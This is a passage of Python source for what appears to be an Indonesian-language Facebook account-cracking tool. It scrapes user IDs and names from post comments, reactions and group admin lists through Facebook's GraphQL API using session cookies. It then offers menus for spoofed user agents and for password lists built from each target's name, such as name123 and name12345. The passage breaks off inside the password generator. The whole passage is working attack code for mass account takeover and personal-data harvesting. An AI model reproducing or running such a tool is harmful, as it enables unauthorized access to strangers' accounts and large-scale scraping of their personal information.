                        Dump.append(f'{z[1].replace("profile.php?id=", "")}|{z[0]}')
                        print(f"[bold dodger_blue3]   ╰─>[bold yellow] Dump @{str(z[1]).replace('profile.php?id=', '')[:20]}/{len(Dump)} Username...         ", end='\r')
                        time.sleep(0.0007)
                try:
                    self.end_cursor = re.findall('"page_info":{"end_cursor":"(.*?)",', str(response))
                    self.feedback_id = re.search('{"feedback":{"id":"(.*?)"}', str(response)).group(1)
                    self.Next_Cursor_Komentar(self.__user, cookies, self.fb_dtsg, self.jazoest, self.lsd, self.end_cursor[len(self.end_cursor) - 2], self.feedback_id)
                except (IndexError):
                    print("[bold dodger_blue3]   ╰─>[bold red] AttributeError!                     ", end='\r')
                    time.sleep(2.5)
                    return ("Dump AttributeError")
        except (KeyboardInterrupt):
            print("\r                                                                   ", end='\r')
            return ("Dump KeyboardInterrupt")
        except (RecursionError):
            print("[bold dodger_blue3]   ╰─>[bold red] RecursionError!                     ", end='\r');time.sleep(2.5)
            return ("Dump RecursionError")

    def Next_Cursor_Komentar(self, cookies, __user, fb_dtsg, jazoest, lsd, cursor, feedback_id):
        with requests.Session() as r:
            r.headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'sec-fetch-mode': 'cors',
                'origin': 'https://web.facebook.com',
                'referer': 'https://web.facebook.com/',
                'sec-fetch-site': 'same-origin',
                'accept': '*/*',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                'x-asbd-id': '198387',
                'x-fb-lsd': lsd,
                'accept-language': 'en-US,en;q=0.9',
                'sec-fetch-dest': 'empty',
                'x-fb-friendly-name': 'CometUFICommentsProviderForDisplayCommentsQuery',
                'Host': 'web.facebook.com',
            })
            data = {
                '__user': __user,
                'fb_api_req_friendly_name': 'CometUFICommentsProviderForDisplayCommentsQuery',
                'lsd': lsd,
                'variables': '{"UFI2CommentsProvider_commentsKey":"CometSinglePostRoute","__false":false,"__true":true,"after":"' + str(cursor) + '","before":null,"displayCommentsContextEnableComment":null,"displayCommentsContextIsAdPreview":null,"displayCommentsContextIsAggregatedShare":null,"displayCommentsContextIsStorySet":null,"displayCommentsFeedbackContext":null,"feedLocation":"PERMALINK","feedbackSource":2,"first":50,"focusCommentID":null,"includeHighlightedComments":false,"includeNestedComments":true,"initialViewOption":"RANKED_THREADED","isInitialFetch":false,"isPaginating":true,"last":null,"scale":1.5,"topLevelViewOption":null,"useDefaultActor":false,"viewOption":null,"id":"' + str(feedback_id) + '"}',
                'jazoest': jazoest,
                'doc_id': '6453366734757512',
                'fb_dtsg': fb_dtsg,
            }
            response = r.post('https://web.facebook.com/api/graphql/', data = data, cookies = {
                'cookie': cookies
            })
            self.find_all_user = re.findall('"author":{"__typename":"User","id":"(\d+)","name":"(.*?)",', str(response.text))
            for z in self.find_all_user:
                try:
                    self.user, self.name = z[0], z[1]
                    if str(self.user) in str(Dump) or len(self.name) > 40 or len(self.user) > 30:
                        continue
                    else:
                        Dump.append(f'{self.user}|{self.name}')
                        print(f"[bold dodger_blue3]   ╰─>[bold green] Dump @{str(self.user)[:20]}/{len(Dump)} Username...         ", end='\r')
                        time.sleep(0.0007)
                except (IndexError):
                    continue
            #try:
                #for z in json.loads(response.text)['data']['node']['display_comments']['edges']:
                    #try:
                        #self.user, self.name = z['node']['author']['url'].split('https://web.facebook.com/')[1].replace('profile.php?id=', ''), z['node']['author']['name']
                        #if str(self.user) in str(Dump) or len(self.name) > 40 or len(self.user) > 30:
                            #continue
                        #else:
                            #Dump.append(f'{self.user}|{self.name}')
                            #print(f"[bold dodger_blue3]   ╰─>[bold green] Dump @{str(self.user)[:20]}/{len(Dump)} Username...         ", end='\r');time.sleep(0.0007)
                    #except (TypeError):
                        #continue
            #except (AttributeError, KeyError, IndexError):
                #for z in json.loads(response.text)['data']['node']['display_comments']['edges']:
                    #try:
                        #self.user, self.name = z['node']['author']['id'], z['node']['author']['name']
                        #if str(self.user) in str(Dump) or len(self.name) > 40 or len(self.user) > 30:
                            #continue
                        #else:
                            #Dump.append(f'{self.user}|{self.name}')
                            #print(f"[bold dodger_blue3]   ╰─>[bold green] Dump @{str(self.user)[:20]}/{len(Dump)} Username...         ", end='\r');time.sleep(0.0007)
                    #except (TypeError):
                        #continue
            try:
                self.end_cursor = re.findall('"page_info":{"end_cursor":"(.*?)","has_next_page":true,', str(response.text))
                self.Next_Cursor_Komentar(cookies, __user, fb_dtsg, jazoest, lsd, self.end_cursor[len(self.end_cursor) - 1], feedback_id)
            except (IndexError):
                return ("Dump Sukses")

    def Get_Likes_Count(self, cookies, link_postingan):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-fetch-user': '?1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                    'accept-language': 'en-US,en;q=0.9',
                    'sec-fetch-dest': 'document',
                    'Host': 'web.facebook.com',
                })

                response = r.get(link_postingan, cookies = {
                    'cookie': cookies
                }).text

                self.__user = re.search('"USER_ID":"(\d+)"', str(response)).group(1)
                self.fb_dtsg = re.search('"DTSGInitData",\\[\\],{"token":"(.*?)"', str(response)).group(1)
                self.jazoest = re.search('jazoest=(\d+)"', str(response)).group(1)
                self.lsd = re.search('"LSD",\\[\\],{"token":"(.*?)"', str(response)).group(1)
                self.feedbackTargetID = re.search('"feedback":{"id":"(.*?)"', str(response)).group(1)

                r.headers.update({
                    'content-type': 'application/x-www-form-urlencoded',
                    'sec-fetch-mode': 'cors',
                    'origin': 'https://web.facebook.com',
                    'referer': 'https://web.facebook.com/',
                    'sec-fetch-site': 'same-origin',
                    'accept': '*/*',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                    'x-asbd-id': '198387',
                    'x-fb-lsd': self.lsd,
                    'accept-language': 'en-US,en;q=0.9',
                    'sec-fetch-dest': 'empty',
                    'x-fb-friendly-name': 'CometUFIReactionsDialogQuery',
                    'Host': 'web.facebook.com',
                })
                data = {
                    '__user': self.__user,
                    'fb_api_req_friendly_name': 'CometUFIReactionsDialogQuery',
                    'lsd': self.lsd,
                    'variables': '{"feedbackTargetID":"'+ str(self.feedbackTargetID) +'","scale":1.5}',
                    'jazoest': self.jazoest,
                    'doc_id': '6443454529016333',
                    'fb_dtsg': self.fb_dtsg,
                }
                response2 = r.post('https://web.facebook.com/api/graphql/', data = data, cookies = {
                    'cookie': cookies
                })
                self.find_all_user = re.findall('"name":"(.*?)","__isEntity":"User","profile_url":.*?,"url":"https://web.facebook.com/(.*?)"', str(response2.text))
                for z in self.find_all_user:
                    try:
                        self.user, self.name = str(z[1]).replace('profile.php?id=', ''), z[0]
                        if str(self.user) in str(Dump) or len(self.name) > 40 or len(self.user) > 40:
                            continue
                        else:
                            Dump.append(f'{self.user}|{self.name}')
                            print(f"[bold dodger_blue3]   ╰─>[bold green] Dump @{str(self.user)[:20]}/{len(Dump)} Username...         ", end='\r')
                            time.sleep(0.0007)
                    except (IndexError):
                        continue
                #self.find_user_likes = re.findall('"name":"(.*?)","__isEntity":"User","profile_url":"https://web.facebook.com/(.*?)"', str(response2.text))
                #for z in self.find_user_likes:
                    #if str(z[1].replace('profile.php?id=', '')) in str(Dump) or len(z[1].replace('profile.php?id=', '')) > 40:
                        #continue
                    #else:
                        #Dump.append(f'{z[1].replace("profile.php?id=", "")}|{z[0]}')
                        #print(f"[bold dodger_blue3]   ╰─>[bold yellow] Dump @{str(z[1]).replace('profile.php?id=', '')[:20]}/{len(Dump)} Username...         ", end='\r');time.sleep(0.0007)
                try:
                    self.end_cursor = re.search('{"has_next_page":true,"end_cursor":"(.*?)"}}}}', str(response2.text)).group(1)
                    self.feedbackTargetID = re.search('"important_reactors":{"edges":\\[\\]},"id":"(.*?)",', str(response2.text)).group(1)
                except (AttributeError):
                    print("[bold dodger_blue3]   ╰─>[bold red] AttributeError!                     ", end='\r')
                    time.sleep(2.5)
                    return ("Dump AttributeError")
                self.Next_Cursor_Likes(cookies, self.__user, self.fb_dtsg, self.jazoest, self.lsd, self.end_cursor, self.feedbackTargetID)
        except (KeyboardInterrupt):
            print("\r                                                                   ", end='\r')
            return ("Dump KeyboardInterrupt")
        except (RecursionError):
            print("[bold dodger_blue3]   ╰─>[bold red] RecursionError!                     ", end='\r')
            time.sleep(2.5)
            return ("Dump RecursionError")

    def Next_Cursor_Likes(self, cookies, __user, fb_dtsg, jazoest, lsd, cursor, feedbackTargetID):
        with requests.Session() as r:
            r.headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'sec-fetch-mode': 'cors',
                'origin': 'https://web.facebook.com',
                'referer': 'https://web.facebook.com/',
                'sec-fetch-site': 'same-origin',
                'accept': '*/*',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                'x-asbd-id': '198387',
                'x-fb-lsd': lsd,
                'accept-language': 'en-US,en;q=0.9',
                'sec-fetch-dest': 'empty',
                'x-fb-friendly-name': 'CometUFIReactionsDialogTabContentRefetchQuery',
                'Host': 'web.facebook.com',
            })
            data = {
                '__user': __user,
                'fb_api_req_friendly_name': 'CometUFIReactionsDialogTabContentRefetchQuery',
                'lsd': lsd,
                'variables': '{"count":10,"cursor":"' + str(cursor) + '","feedbackTargetID":"' + str(feedbackTargetID) + '","reactionID":null,"scale":1.5,"id":"' + str(feedbackTargetID) + '"}',
                'jazoest': jazoest,
                'doc_id': '9515494628524128',
                'fb_dtsg': fb_dtsg,
            }
            response = r.post('https://web.facebook.com/api/graphql/', data = data, cookies = {
                'cookie': cookies
            })
            self.find_all_user = re.findall('"name":"(.*?)","__isEntity":"User","profile_url":.*?,"url":"https://web.facebook.com/(.*?)"', str(response.text))
            for z in self.find_all_user:
                try:
                    self.user, self.name = str(z[1]).replace('profile.php?id=', ''), z[0]
                    if str(self.user) in str(Dump) or len(self.name) > 40 or len(self.user) > 40:
                        continue
                    else:
                        Dump.append(f'{self.user}|{self.name}')
                        print(f"[bold dodger_blue3]   ╰─>[bold green] Dump @{str(self.user)[:20]}/{len(Dump)} Username...         ", end='\r')
                        time.sleep(0.0007)
                except (IndexError):
                    continue
            #for z in json.loads(response.text)['data']['node']['reactors']['edges']:
                #try:
                    #self.user, self.name = z['node']['profile_url'].split('https://web.facebook.com/')[1].replace('profile.php?id=', ''), z['node']['name']
                    #if str(self.user) in str(Dump) or len(self.name) > 40 or len(self.user) > 30 or '-' in str(self.user):
                        #continue
                    #elif 'people/' in str(self.user):
                        #Dump.append(f'{re.search("people/(.*?)/", str(self.user)).group(1)}|{self.name}')
                        #print(f"[bold dodger_blue3]   ╰─>[bold green] Dump @{str(re.search('people/(.*?)/', str(self.user)).group(1))[:20]}/{len(Dump)} Username...         ", end='\r');time.sleep(0.0007)
                    #else:
                        #Dump.append(f'{self.user}|{self.name}')
                        #print(f"[bold dodger_blue3]   ╰─>[bold green] Dump @{str(self.user)[:20]}/{len(Dump)} Username...         ", end='\r');time.sleep(0.0007)
                #except (TypeError, AttributeError, IndexError):
                    #continue
            try:
                self.end_cursor = re.search('"end_cursor":"(.*?)"}},"id":"(.*?)"}}', str(response.text))
                self.Next_Cursor_Likes(cookies, __user, fb_dtsg, jazoest, lsd, self.end_cursor.group(1), self.end_cursor.group(2))
            except (AttributeError):
                return ("Dump Sukses")

    def Group_From_Query(self, cookies, query):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-fetch-user': '?1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                    'accept-language': 'en-US,en;q=0.9',
                    'sec-fetch-dest': 'document',
                    'Host': 'web.facebook.com',
                })
                response = r.get('https://web.facebook.com/search/groups/?q={}'.format(query), cookies = {
                    'cookie': cookies
                }).text
                self.all_group_ids = re.findall('"__isNode":".*?","id":"(\d+)","__isEntity":".*?"', str(response))
                for self.id_groups in self.all_group_ids:
                    if str(self.id_groups) in str(Ganda):
                        continue
                    else:
                        print(f"[bold dodger_blue3]   ╰─>[bold red] Dump @{str(self.id_groups)[:20]}/{len(Ganda)} Username...         ", end='\r')
                        Groups.append(f'{self.id_groups}')
                        Ganda.append(f'{self.id_groups}')
                for id_groups in Groups:
                    self.All_Admin_Group(cookies, id_groups)
                Groups.clear()
                self.__user = re.search('"USER_ID":"(\d+)"', str(response)).group(1)
                self.fb_dtsg = re.search('"DTSGInitData",\\[\\],{"token":"(.*?)"', str(response)).group(1)
                self.jazoest = re.search('jazoest=(\d+)"', str(response)).group(1)
                self.lsd = re.search('"LSD",\\[\\],{"token":"(.*?)"', str(response)).group(1)
                if '"has_next_page":true,"end_cursor":' in str(response):
                    self.cursor = re.search('{"has_next_page":true,"end_cursor":"(.*?)"}', str(response)).group(1)
                    self.bsid = re.search('{"session_id":"(.*?)",', str(response)).group(1)
                    time.sleep(2.5)
                    self.Next_Cursor_Group(cookies, query, self.__user, self.fb_dtsg, self.jazoest, self.lsd, self.bsid, self.cursor)
                else:
                    return ("Dump Gagal")
        except (KeyboardInterrupt):
            print("\r                                                                   ", end='\r')
            return ("Dump KeyboardInterrupt")
        except (RecursionError):
            print("[bold dodger_blue3]   ╰─>[bold red] RecursionError!                     ", end='\r')
            time.sleep(2.5)
            return ("Dump RecursionError")

    def Next_Cursor_Group(self, cookies, query, __user, fb_dtsg, jazoest, lsd, bsid, cursor):
        with requests.Session() as r:
            r.headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'sec-fetch-mode': 'cors',
                'origin': 'https://web.facebook.com',
                'referer': 'https://web.facebook.com/search/groups/?q={}'.format(query),
                'sec-fetch-site': 'same-origin',
                'accept': '*/*',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                'x-asbd-id': '198387',
                'x-fb-lsd': lsd,
                'accept-language': 'en-US,en;q=0.9',
                'sec-fetch-dest': 'empty',
                'x-fb-friendly-name': 'SearchCometResultsPaginatedResultsQuery',
                'Host': 'web.facebook.com',
            })
            data = {
                '__user': __user,
                'fb_api_req_friendly_name': 'SearchCometResultsPaginatedResultsQuery',
                'lsd': lsd,
                'variables': '{"UFI2CommentsProvider_commentsKey":"SearchCometResultsInitialResultsQuery","allow_streaming":false,"args":{"callsite":"COMET_GLOBAL_SEARCH","config":{"exact_match":false,"high_confidence_config":null,"intercept_config":null,"sts_disambiguation":null,"watch_config":null},"context":{"bsid":"' + str(bsid) + '","tsid":null},"experience":{"encoded_server_defined_params":null,"fbid":null,"type":"GROUPS_TAB"},"filters":[],"text":"' + str(query) + '"},"count":5,"cursor":"' + str(cursor) + '","displayCommentsContextEnableComment":false,"displayCommentsContextIsAdPreview":false,"displayCommentsContextIsAggregatedShare":false,"displayCommentsContextIsStorySet":false,"displayCommentsFeedbackContext":null,"feedLocation":"SEARCH","feedbackSource":23,"fetch_filters":true,"focusCommentID":null,"locale":null,"privacySelectorRenderLocation":"COMET_STREAM","renderLocation":"search_results_page","scale":1.5,"stream_initial_count":0,"useDefaultActor":false,"__relay_internal__pv__IsWorkUserrelayprovider":false,"__relay_internal__pv__IsMergQAPollsrelayprovider":false,"__relay_internal__pv__CometUFIIsRTAEnabledrelayprovider":false,"__relay_internal__pv__StoriesArmadilloReplyEnabledrelayprovider":false,"__relay_internal__pv__StoriesRingrelayprovider":false}',
                'jazoest': jazoest,
                'doc_id': '6096851183754861',
                'fb_dtsg': fb_dtsg,
            }
            response = r.post('https://web.facebook.com/api/graphql/', data = data, cookies = {
                'cookie': cookies
            })
            self.all_group_ids = re.findall('"__isNode":".*?","id":"(\d+)","__isEntity":".*?"', str(response.text))
            for self.id_groups in self.all_group_ids:
                if str(self.id_groups) in str(Ganda):
                    continue
                else:
                    print(f"[bold dodger_blue3]   ╰─>[bold green] Dump @{str(self.id_groups)[:20]}/{len(Ganda)} Username...         ", end='\r')
                    Groups.append(f'{self.id_groups}')
                    Ganda.append(f'{self.id_groups}')
            for id_groups in Groups:
                self.All_Admin_Group(cookies, id_groups)
            Groups.clear()
            if '{"has_next_page":true,"end_cursor"' in str(response.text):
                time.sleep(2.5)
                self.end_cursor = re.search('{"has_next_page":true,"end_cursor":"(.*?)"}', str(response.text)).group(1)
                self.Next_Cursor_Group(cookies, query, __user, fb_dtsg, jazoest, lsd, bsid, self.end_cursor)
            else:
                time.sleep(2.5)
                return ("Dump Sukses")
            
    def All_Admin_Group(self, cookies, id_groups):
        with requests.Session() as r:
            r.headers.update({
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'sec-fetch-user': '?1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                'accept-language': 'en-US,en;q=0.9',
                'sec-fetch-dest': 'document',
                'Host': 'web.facebook.com',
            })
            response = r.get('https://web.facebook.com/groups/{}/members/admins'.format(id_groups), cookies = {
                'cookie': cookies
            }).text
            if 'Anda Diblokir Sementara' in str(response) or 'Anda dilarang menggunakan fitur ini untuk sementara.' in str(response):
                print("[bold dodger_blue3]   ╰─>[bold red] Anda Diblokir Sementara!           ", end='\r')
                time.sleep(2.5)
                return ("Anda Diblokir Sementara")
            self.find_all_user = re.findall('"__typename":"User","id":"(.*?)","__isProfile":"User","name":"(.*?)","is_verified":.*?,', str(response))
            if len(self.find_all_user) == 0:
                if 'Grup Privat' in str(response):
                    return ("Group Dalam Keadaan Private")
                else:
                    print("[bold dodger_blue3]   ╰─>[bold red] Ditemukan Group Tanpa Admin!           ", end='\r')
                    time.sleep(1.5)
                    try:
                        self.group_name = re.search('"id":".*?","name":"(.*?)","profile_picture', str(response)).group(1)
                        self.member_count = re.search('"group_member_profiles":{"formatted_count_text":"(.*?)"}', str(response)).group(1)
                    except (AttributeError):
                        self.group_name, self.member_count = ('null', 0)
                    with open('Results/Ok.txt', 'a+') as w:
                        w.write(f'{id_groups}|{self.member_count}|{self.group_name}\n')
                    w.close()
                    return ("Tidak Ada Admin")
            for z in self.find_all_user:
                self.user, self.name = z[0], z[1]
                if str(self.user) in str(Dump) or len(self.name) > 40:
                    continue
                else:
                    print(f"[bold dodger_blue3]   ╰─>[bold yellow] Dump @{str(self.user)[:20]}/{len(Dump)} Username...         ", end='\r')
                    Dump.append(f'{self.user}|{self.name}')
            self.__user = re.search('"USER_ID":"(\d+)"', str(response)).group(1)
            self.fb_dtsg = re.search('"DTSGInitData",\\[\\],{"token":"(.*?)"', str(response)).group(1)
            self.jazoest = re.search('jazoest=(\d+)"', str(response)).group(1)
            self.lsd = re.search('"LSD",\\[\\],{"token":"(.*?)"', str(response)).group(1)
            if '"has_next_page":true,"end_cursor":' in str(response):
                self.cursor = re.search('{"has_next_page":true,"end_cursor":"(.*?)"}', str(response)).group(1)
                self.Next_All_Admin_Group(cookies, id_groups, self.__user, self.fb_dtsg, self.jazoest, self.lsd, self.cursor)
            else:
                return ("Dump Sukses")

    def Next_All_Admin_Group(self, cookies, id_groups, __user, fb_dtsg, jazoest, lsd, cursor):
        with requests.Session() as r:
            r.headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'sec-fetch-mode': 'cors',
                'origin': 'https://web.facebook.com',
                'referer': 'https://web.facebook.com/groups/{}/members/admins'.format(id_groups),
                'sec-fetch-site': 'same-origin',
                'accept': '*/*',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                'x-asbd-id': '198387',
                'x-fb-lsd': lsd,
                'accept-language': 'en-US,en;q=0.9',
                'sec-fetch-dest': 'empty',
                'x-fb-friendly-name': 'GroupsCometMembersPageAdminsSectionPaginationQuery',
                'Host': 'web.facebook.com',
            })
            data = {
                '__user': __user,
                'fb_api_req_friendly_name': 'GroupsCometMembersPageAdminsSectionPaginationQuery',
                'lsd': lsd,
                'variables': '{"count":10,"cursor":"' + str(cursor) + '","groupID":"' + str(id_groups) + '","scale":1.5,"id":"' + str(id_groups) + '"}',
                'jazoest': jazoest,
                'doc_id': '6565961460106645',
                'fb_dtsg': fb_dtsg,
            }
            response = r.post('https://web.facebook.com/api/graphql/', data = data, cookies = {
                'cookie': cookies
            })
            self.find_all_user = re.findall('"__typename":"User","id":"(.*?)","__isProfile":"User","name":"(.*?)","is_verified":.*?,', str(response.text))
            for z in self.find_all_user:
                self.user, self.name = z[0], z[1]
                if str(self.user) in str(Dump) or len(self.name) > 40:
                    continue
                else:
                    print(f"[bold dodger_blue3]   ╰─>[bold green] Dump @{str(self.user)[:20]}/{len(Dump)} Username...         ", end='\r')
                    Dump.append(f'{self.user}|{self.name}')
            if '{"has_next_page":true,"end_cursor"' in str(response.text):
                self.end_cursor = re.search('{"has_next_page":true,"end_cursor":"(.*?)"}', str(response.text)).group(1)
                self.Next_All_Admin_Group(cookies, id_groups, __user, fb_dtsg, jazoest, lsd, self.end_cursor)
            else:
                return ("Dump Sukses")

    def Emails(self, nama_depan, domain):
        try:
            for number in range(0, 999):
                self.email = (f'{nama_depan}{number}{domain}')
                self.name = (f'{nama_depan} {number}')
                if str(self.email) in str(Dump):
                    pass
                else:
                    Dump.append(f'{self.email}|{self.name}')
                    print(f"[bold dodger_blue3]   ╰─>[bold green] Dump @{str(self.email)[:20]}/{len(Dump)} Username...         ", end='\r')
                    time.sleep(0.007)
            return ("Dump Sukses")
        except (KeyboardInterrupt):
            print("\r                                                                   ", end='\r')
            return ("Dump KeyboardInterrupt")

class Convert:

    def __init__(self) -> None:
        pass

    def To_Userid(self, cookies, username):
        with requests.Session() as r:
            r.headers.update({
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'sec-fetch-user': '?1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                'accept-language': 'en-US,en;q=0.9',
                'sec-fetch-dest': 'document',
                'Host': 'web.facebook.com',
            })
            response = r.get('https://web.facebook.com/{}'.format(username), cookies = {
                'cookie': cookies
            }).text
            self.userid = re.search('"userID":"(\d+)",', str(response)).group(1)
            try:
                self.get_total_teman = str(re.search('"text":"(.*?)"},"uri":"https:\\\/\\\/web.facebook.com\\\/.*?\\\/friends\\\/"}', str(response)).group(1)).replace('\\u00a0', ' ')
            except (AttributeError):
                self.get_total_teman = ('0K friends')
            try:
                self.total_followers = str(re.search('/followers","__isNode":"ExternalUrl".*?"text":"(.*?)"}', str(response)).group(1))
            except (AttributeError):
                self.total_followers = ('Diikuti oleh 0 orang')
        Console(width = 65, style = "bold dodger_blue3").print(Panel(f"""[bold white]Followers :[bold yellow] {self.total_followers}
[bold white]Link :[bold green] https://m.facebook.com/profile.php?id={self.userid}
[bold white]Friends :[bold yellow] {self.get_total_teman}"""));exit()
        
    def Tanggal(self):
        return (datetime.datetime.now().strftime("%d-%B-%Y"))

class Pilihan:

    def __init__(self) -> None:
        pass

    def Settingan(self):
        Console(width = 65, style = "bold dodger_blue3").print(Panel(f"""[bold green]01[bold white]. Gunakan Setingan Useragent Manual ([bold green]Recommended[bold white])
[bold green]02[bold white]. Gunakan Setingan Useragent Otomatis ([bold red]Not Recommended[bold white])""", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Pilih Setingan)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
        setingan = Console().input("[bold dodger_blue3]   ╰─> ")
        if setingan == '01' or setingan == '1':
            self.User_Agent()
        else:
            Useragent.update({
                "Device": "Windows"
            })
            Password.update({
                "Type": "Lengkap"
            })
            Crack().Cracking(False)

    def User_Agent(self):
        Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Silahkan Masukan[italic green] Useragent[italic white] Dari ([italic yellow]Xiaomi,Oppo,Huawei,Vivo,\nInfinix,Sony,Mito,Samsung,Realme,Asus,Lenovo,Iphone,Oneplus,Advan,Poco,Evercoss,Nokia,BlackBerry[italic white]) Gunakan[italic red] Koma[italic white] Untuk Random Useragent, Misalnya :[italic green] Realme,Xiaomi,Iphone", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Pilih Useragent)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
        useragent = Console().input("[bold dodger_blue3]   ╰─> ")
        if len(useragent) == 0:
            Useragent.update({
                "Device": "Realme"
            })
        else:
            Useragent.update({
                "Device": f"{str(useragent).replace(' ', '')}"
            })
        self._Password()

    def _Password(self):
        Console(width = 65, style = "bold dodger_blue3").print(Panel(f"""[bold green]01[bold white]. Gunakan Password Lengkap ([bold green]Nama, Nama123, Nama12345, Dll[bold white])
[bold green]02[bold white]. Gunakan Password Default ([bold green]Nama, Nama123, Nama12345[bold white])
[bold green]03[bold white]. Gunakan Password Manual ([bold green]Sayang, 123456, Bangsat[bold white])
[bold green]04[bold white]. Gunakan Password Gabungan ([bold green]Nama123, Nama12345 + Input[bold white])""", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Pilih Password)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
        password = Console().input("[bold dodger_blue3]   ╰─> ")
        if password == '1' or password == '01':
            Password.update({
                "Type": "Lengkap"
            })
        elif password == '3' or password == '03':
            Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Silahkan Masukan[italic green] Password[italic white], Gunakan Lebih Dari[italic red] 6 Huruf[italic white] Dan Gunakan[italic green] Koma[italic white] Untuk Password Acak, Misalnya :[italic green] Sayang,Cantik", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Input Password)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
            manual = Console().input("[bold dodger_blue3]   ╰─> ")
            for z in manual.split(','):
                if len(str(z)) < 6 or str(z) in str(Manual):
                    continue
                else:
                    Manual.append(str(z))
            if len(Manual) == 0:
                Password.update({
                    "Type": "Default"
                })
            else:
                Password.update({
                    "Type": "Manual"
                })
        elif password == '4' or password == '04':
            Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Silahkan Masukan[italic green] Password[italic white], Gunakan Lebih Dari[italic red] 6 Huruf[italic white] Dan Gunakan[italic green] Koma[italic white] Untuk Password Acak, Misalnya :[italic green] Sayang,Cantik", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Input Password)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
            manual = Console().input("[bold dodger_blue3]   ╰─> ")
            for z in manual.split(','):
                if len(str(z)) < 6 or str(z) in str(Manual):
                    continue
                else:
                    Manual.append(str(z))
            if len(Manual) == 0:
                Password.update({
                    "Type": "Default"
                })
            else:
                Password.update({
                    "Type": "Gabungan"
                })
        else:
            Password.update({
                "Type": "Default"
            })
        Crack().Cracking(True)

class Crack:

    def __init__(self) -> None:
        pass

    def Generate_Password(self, name):
        self.password_, self.password = (Password['Type'].capitalize()), []
        if "Gabungan" in str(self.password_):
            for nama in name.split(' '):
                if len(nama) < 3:
                    continue
                else:
                    for passwords in [f'{nama}', f'{nama}123', f'{nama}12345']:
                        if len(passwords) < 6 or str(passwords).isalnum() == False or len(name.split(' ')) > 5:
                            continue
                        else:
                            self.password.append(f'{str(passwords).lower()}')
            for passwords in [f'{name}', f'{name.replace(" ", "")}']:
                if len(passwords) < 6 or str(passwords).replace(' ', '').isalnum() == False:
                    continue
                else:
                    self.password.append(f'{str(passwords).lower()}')
            for z in Manual:
                if len(str(z)) < 6:
                    continue
                else:
                    self.password.append(str(z).lower())
            return (self.password)
        elif "Manual" in str(self.password_):
            for z in Manual:
                if len(str(z)) < 6:
                    continue
                else:
                    self.password.append(str(z).lower())
            return (self.password)
        elif "Lengkap" in str(self.password_):
            for nama in name.split(' '):
                if len(nama) < 3:
                    continue
                else:
                    for passwords in [f'{nama}123', f'{nama}1234', f'{nama}12345', f'{nama}123456']:
                        if len(passwords) < 6 or str(passwords).isalnum() == False or len(name.split(' ')) > 5:
                            continue
                        else:
                            self.password.append(f'{str(passwords).lower()}')
            for passwords in [f'{name}', f'{name.replace(" ", "")}']:
                if len(passwords) < 6 or str(passwords).replace(' ', '').isalnum() == False:
                    continue
                else:
                    self.password.append(f'{str(passwords).lower()}')
            return (self.password)
        else:
            for nama in name.split(' '):
                if len(nama) < 3:
                    continue
                else:
                    for passwords in [f'{nama}', f'{nama}123', f'{nama}12345']:
                        if len(passwords) < 6 or str(passwords).isalnum() == False or len(name.split(' ')) > 5:
                            continue
                        else:
